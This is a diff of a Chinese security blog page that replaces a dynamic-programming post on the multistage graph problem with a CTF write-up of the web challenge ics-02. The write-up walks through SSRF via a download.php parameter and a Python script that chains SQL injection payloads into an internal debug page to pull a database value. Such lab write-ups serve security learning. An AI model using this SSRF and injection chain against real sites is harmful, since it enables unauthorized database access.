@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="动态规划_多段图问题, 花城 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="攻防世界web高手进阶之ics-02, 花城 计算机 网络安全 渗透测试">
     <meta name="description" content="本科 | 太原理工大学 | 信息安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -28,7 +28,7 @@
 </script>
 
 
-    <title>动态规划_多段图问题 | 花城</title>
+    <title>攻防世界web高手进阶之ics-02 | 花城</title>
 
     <link rel="icon" type="image/jpeg" href="https://bucket-1305778438.cos.ap-shanghai.myqcloud.com/myblog/logo2.jpg">
 
@@ -527,12 +527,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021129.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021332.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">动态规划_多段图问题</h1>
+                    <h1 class="description center-align post-title">攻防世界web高手进阶之ics-02</h1>
                 </div>
             </div>
         </div>
@@ -653,12 +653,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/">
-                                <span class="chip bg-color">算法设计与分析</span>
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
-                            <a href="/tags/c/">
-                                <span class="chip bg-color">c++</span>
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
                             </a>
                         
                     </div>
@@ -673,8 +673,8 @@
                                 博客篇
                             </a>
                         
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/" class="post-category">
-                                算法篇
+                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/" class="post-category">
+                                CTF笔记篇
                             </a>
                         
                     </div>
@@ -686,28 +686,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-27
+                    2021-09-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-28
+                    2021-09-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    835
+                    444
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -725,92 +725,70 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr>
-<p>  将$n$个资源分配给$r$个项目，已知如果把$j$个资源分配给第$i$个项目，可以收益$N(i,j),0 \leq j \leq n,1 \leq i \leq r$,求总收益最大的资源分配方案。</p>
-<h2 id="0x002-问题分析"><a href="#0x002-问题分析" class="headerlink" title="0x002 问题分析"></a>0x002 问题分析</h2><hr>
-<p>1.用$r+1$段图描述</p>
-<p>2.每个状态节点$V(i,j)$代表已将$j$个资源分配给前$i-1$个项目</p>
-<p>3.边都具有$(V(i,j),V(i+1,k))(0 \leq j \leq k \leq n,1 \leq i \leq r)$</p>
-<p>4.边上的权值$N(i,k-j)$是本次分配的收益</p>
-<p>5.$r+1$个阶段</p>
-<ul>
-<li>第一个阶段：开始阶段尚未分配任何资源，只包含一个初始状态$S=V(1，0)$</li>
-<li>第$r+1$阶段：结束阶段，表示整个分配完成，只有一个结束状态$t=V(r+1,n)$</li>
-<li>其他$r-1$个中间阶段：每个阶段包含$n+1$个状态</li>
-</ul>
-<h2 id="0x003-多段图概述"><a href="#0x003-多段图概述" class="headerlink" title="0x003 多段图概述"></a>0x003 多段图概述</h2><hr>
-<p>  设图 $G =(V,E)$是一个带权有向图，如果把顶点集合 $V$ 划分成$k$个互不相交的子集 $V_i(2\leq k\leq n,1\leq i\leq k)$，使得$E$ 中的任何一条边 $<u,v>$，必有 $u∈Vi, v∈Vi + m(1\leq i &lt; k, 1&lt;i+m\leq k)$,则称图 $G$ 为多段图，称 $s∈V_1$ 为源点，$t∈V_k$ 为终点。多段图的最短路径问题为从源点到终点的最小代价路径。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210704124729285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="多段图"></u,v></p>
-<h2 id="0x004-递推关系"><a href="#0x004-递推关系" class="headerlink" title="0x004 递推关系"></a>0x004 递推关系</h2><hr>
-<p>（从后）向前递推关系式</p>
-<script type="math/tex; mode=display">
- \begin{cases}
-   cost(i,j)= \min\limits_{j∈V_i,p∈V_{i+1},<i,p>∈E} \{c(j,p)+cost(i+1,p)\} &\text{if } 0\leq i \leq k-2 \\
-   cost(k,t)=0 
-\end{cases}</script><p>$cost(i,j)$是从第$i$阶段中某个节点状态$j$到汇点状态$t$的最短路径长度，$cost(1,0)$为多段图问题的最优解值，即为所求。</p>
-<p>设$d(i,j)$表示从第$i$阶段节点$j$到$t$的最短路径上节点$j$的下一个节点编号，利用$d$值进行反向追溯可确定最短路径上的节点。</p>
-<h2 id="0x005-程序设计"><a href="#0x005-程序设计" class="headerlink" title="0x005 程序设计"></a>0x005 程序设计</h2><hr>
-<ul>
-<li>数据结构：采用邻接表存储该有向无环图的节点及边的信息</li>
-<li>源点$s$编号为0，汇点的编号为$n-1$（共有$n$节点，$m$条边）</li>
-<li>$cost[i]$保存节点$i$到汇点$t$的最短路径长度</li>
-<li>$cost[n-1]$为0，汇点到汇点的最短路径长度为0</li>
-<li>$cost[0]$为最优解值，为计算$cost[j]$,必须计算子问题：后继节点$p$到汇点的最短路径$cost[p]$</li>
-<li>$cost[j]=\min{c(j,p)+cost[p]}$,$c(j,p)$为边$<j,p>$的长度（权）</j,p></li>
-</ul>
-<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><hr>
-<ul>
-<li>节点结构</li>
-</ul>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Struct ENode<span class="token punctuation">{</span>
-	<span class="token keyword">int</span> adjVex<span class="token punctuation">;</span>
-	<span class="token keyword">int</span> w<span class="token punctuation">;</span>
-	ENode <span class="token operator">*</span>nextArc
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>其他变量</li>
-</ul>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Struct ENode<span class="token operator">&gt;</span> a<span class="token punctuation">;</span><span class="token comment">//邻接表，数组中存节点</span>
-vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> cost<span class="token punctuation">;</span><span class="token comment">//最短长度</span>
-<span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//总节点数</span>
-<span class="token keyword">int</span> m<span class="token punctuation">;</span><span class="token comment">//总边数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>构建邻接表</li>
-</ul>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">CreatGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">int</span> u<span class="token punctuation">,</span>v<span class="token punctuation">;</span>
-	<span class="token keyword">int</span> w<span class="token punctuation">;</span>
-	Struct ENode t<span class="token punctuation">;</span>
-	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-		a<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">}</span>
-	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-		cin <span class="token operator">&gt;&gt;</span> u <span class="token operator">&gt;&gt;</span> v <span class="token operator">&gt;&gt;</span> w<span class="token punctuation">;</span>
-		t<span class="token operator">-&gt;</span>adjVex <span class="token operator">=</span> v<span class="token punctuation">;</span>
-		t<span class="token operator">-&gt;</span>nextArc <span class="token operator">=</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>
-		t<span class="token operator">-&gt;</span>w <span class="token operator">=</span> w<span class="token punctuation">;</span>
-		a<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>
-	<span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>向前递推算法</li>
-</ul>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">FMultiGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	cost<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-	<span class="token keyword">int</span> min<span class="token punctuation">;</span>
-	Struct ENode r<span class="token punctuation">;</span>
-	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-		min <span class="token operator">=</span> max<span class="token punctuation">;</span>
-		<span class="token keyword">for</span><span class="token punctuation">(</span>Struct ENode r <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>r<span class="token punctuation">;</span>r <span class="token operator">=</span> r<span class="token operator">-&gt;</span>nextArc<span class="token punctuation">)</span><span class="token punctuation">{</span>
-			<span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">-&gt;</span>w <span class="token operator">+</span> cost<span class="token punctuation">[</span>r<span class="token operator">-&gt;</span>adjVex<span class="token punctuation">]</span> <span class="token operator">&lt;</span> min<span class="token punctuation">)</span><span class="token punctuation">{</span>
-				min <span class="token operator">=</span> r<span class="token operator">-&gt;</span>w <span class="token operator">+</span> cost<span class="token punctuation">[</span>r<span class="token operator">-&gt;</span>adjVex<span class="token punctuation">]</span><span class="token punctuation">;</span>
-			<span class="token punctuation">}</span>
-		<span class="token punctuation">}</span>
-		cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">;</span>
-	<span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="0x006-结束语"><a href="#0x006-结束语" class="headerlink" title="0x006 结束语"></a>0x006 结束语</h2><hr>
+                <h2 id="0x001-wp"><a href="#0x001-wp" class="headerlink" title="0x001 wp"></a>0x001 wp</h2><hr>
+<p>进入文档中心页面，点击paper可以下载pdf文件，请求download.php，参数为dl</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/e9afdd028be737ec0ecebea34908124a.png#pic_center" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/5e24a1c524834b2488363c7310c1787d.png#pic_center" alt=""></p>
+<p><code>pdf</code>文件内容为<code>ssrf</code>，可能为线索</p>
+<p>接着扫一遍目录，发现了<code>/secret</code>目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/d78799738ec286aac5fa3654e5dd79b4.png#pic_center" alt=""></p>
+<p>访问一下试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/1cba1775d955d707a3aa1e350b7e58af.png#pic_center" alt=""></p>
+<p>分别访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/5b85600d0460721f556366b282e93070.png#pic_center" alt=""></p>
+<p>看到私密页面1，查看元素，填完表提交，到达私密页面2，元素有一个变量s，s=3时返回页面2</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/2fb8340990561fb75ea08d6bcb67a335.png#pic_center" alt=""></p>
+<p>发现<code>secret_debug.php</code>无法访问</p>
+<p>到这里就无头绪了，wp大法，利用<code>download.php</code>传参进行<code>ssrf</code>攻击</p>
+<p>虽然只能下载<code>pdf</code>文件，但是下载一个不存在的文件的时候<code>readfile</code>函数还是会执行的。</p>
+<p>根据<code>secret</code>参数带入<code>secret_debug</code>构造请求</p>
+<p><code>http://111.200.241.244:64242/secret/secret_debug.php？s=3&amp;txtfirst_name=a&amp;txtmiddle_name=b&amp;txtlast_name=c&amp;txtname_suffix=d&amp;txtdob=01/05/2000&amp;txtdl_nmbr=1234&amp;txtretypedl=1234</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/09587a8395c0263a1bae9cceaa078662.png#pic_center" alt=""></p>
+<p>发现<code>.pdf</code>加在了<code>s=3</code>后面，&amp;符号导致，所以进行<code>url</code>编码，服务器再解码，<code>.pdf</code>就会加到所有参数最后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/14b0246f279c125f3a41fd77384ae94b.png#pic_center" alt=""></p>
+<p>还是有问题，<code>.pdf</code>加在最后一个参数后面会影响其值，所以在参数后面再加一个&amp;，相当于隔断了<code>pdf</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/057f4dc3fc2700e2819ca4679365972b.png#pic_center" alt=""></p>
+<p>注册成功。。注册的参数可以进行<code>sql注入</code>，大神的脚本：</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> urllib
+
+url <span class="token operator">=</span> <span class="token string">' http://111.200.241.244:64242//download.php'</span>
+
+<span class="token comment"># subquery = "database()"</span>
+<span class="token comment"># ssrfw</span>
+<span class="token comment"># subquery = "select group_concat(table_name) from information_schema.tables where table_schema='ssrfw'"</span>
+<span class="token comment"># etcYssrf,users</span>
+<span class="token comment"># subquery = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'"</span>
+<span class="token comment"># secretName,value</span>
+<span class="token comment"># subquery = "select secretName from cetcYssrf LIMIT 1"</span>
+<span class="token comment"># secretname -&gt; flag</span>
+subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>
+<span class="token comment"># value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018}</span>
+
+<span class="token builtin">id</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>
+
+dl <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>
+        urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span> <span class="token string">"A','b',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'c'/*"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span> <span class="token string">"D."</span><span class="token punctuation">,</span>
+            <span class="token string">"txtdob"</span><span class="token punctuation">:</span> <span class="token string">"*/,'01/10/2019"</span><span class="token punctuation">,</span>
+            <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span>
+            <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span> <span class="token builtin">id</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> dl<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></h2><blockquote>
+<p><strong>知识点：</strong></p>
+<p><strong>1.ssrf</strong></p>
+<p><strong>2.sql注入</strong></p>
+</blockquote>
+<h2 id="0x001-结束语"><a href="#0x001-结束语" class="headerlink" title="0x001 结束语"></a>0x001 结束语</h2><hr>
 <blockquote>
-<p><strong><em>旅人等在这里，虔诚仰望着云开</em></strong></p>
+<p><strong><em>莫忘少年凌云志 曾许天下第一流</em></strong></p>
 </blockquote>
 
                 
@@ -838,7 +816,7 @@ vector<span class="token operator">&lt;</span><span class="token keyword">int</s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://huacheng1122.cn/posts/6850d53f.html">https://huacheng1122.cn/posts/6850d53f.html</a>
+                    <a href="https://huacheng1122.cn/posts/83a42f54.html">https://huacheng1122.cn/posts/83a42f54.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -876,12 +854,12 @@ vector<span class="token operator">&lt;</span><span class="token keyword">int</s
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/">
-                                    <span class="chip bg-color">算法设计与分析</span>
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
-                                <a href="/tags/c/">
-                                    <span class="chip bg-color">c++</span>
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
                                 </a>
                             
                         </div>
@@ -1353,29 +1331,30 @@ new Valine({
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/d7a49e9b.html">
+                <a href="/posts/83a42f54.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="分治算法_主元素问题">
+                        <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021332.jpg" class="responsive-img" alt="攻防世界web高手进阶之ics-02">
                         
-                        <span class="card-title">分治算法_主元素问题</span>
+                        <span class="card-title">攻防世界web高手进阶之ics-02</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            分治算法|主元素
+                            攻防世界web高手进阶之ics-02
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1384,23 +1363,24 @@ new Valine({
                                     博客篇
                                 </a>
                             
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/" class="post-category">
-                                    算法篇
+                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/" class="post-category">
+                                    CTF笔记篇
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">算法设计与分析</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/c/">
-                        <span class="chip bg-color">c++</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -1414,23 +1394,24 @@ new Valine({
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/a63d1ca2.html">
+                <a href="/posts/801ceb23.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://huacheng1122.cn/posts/a63d1ca2/02.png" class="responsive-img" alt="记一次博客搭建感受">
                         
-                        <span class="card-title">记一次博客搭建感受</span>
+                        <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021744.jpg" class="responsive-img" alt="攻防世界web高手进阶之blgdel">
+                        
+                        <span class="card-title">攻防世界web高手进阶之blgdel</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            我的新博客搭建好了
+                            攻防世界web高手进阶之blgdel
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-29
                             </span>
                         <span class="publish-author">
                             
@@ -1440,6 +1421,10 @@ new Valine({
                                     博客篇
                                 </a>
                             
+                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/" class="post-category">
+                                    CTF笔记篇
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -1447,8 +1432,12 @@ new Valine({
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%8D%9A%E5%AE%A2/">
-                        <span class="chip bg-color">博客</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -1616,13 +1605,6 @@ new Valine({
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
-    });
-</script>
 
 
 
